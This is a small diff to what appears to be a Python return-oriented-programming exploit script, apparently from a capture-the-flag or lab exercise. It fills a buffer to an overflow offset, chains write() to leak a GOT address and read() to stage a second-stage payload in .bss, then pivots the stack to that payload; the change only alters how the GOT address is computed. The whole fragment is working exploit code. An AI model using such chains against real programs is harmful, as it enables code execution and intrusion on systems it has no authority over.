@@ -9,7 +9,7 @@ addr_stage = rop.section('.bss') + 0x800
 
 buf = rop.fill(offset)
 buf += rop.call_chain_plt(
-    ['write', 1, rop.section('.got.plt')+8, 8],
+    ['write', 1, rop.got()+8, 8],
     ['read', 0, addr_stage, 400]
 )
 buf += rop.pivot(addr_stage)
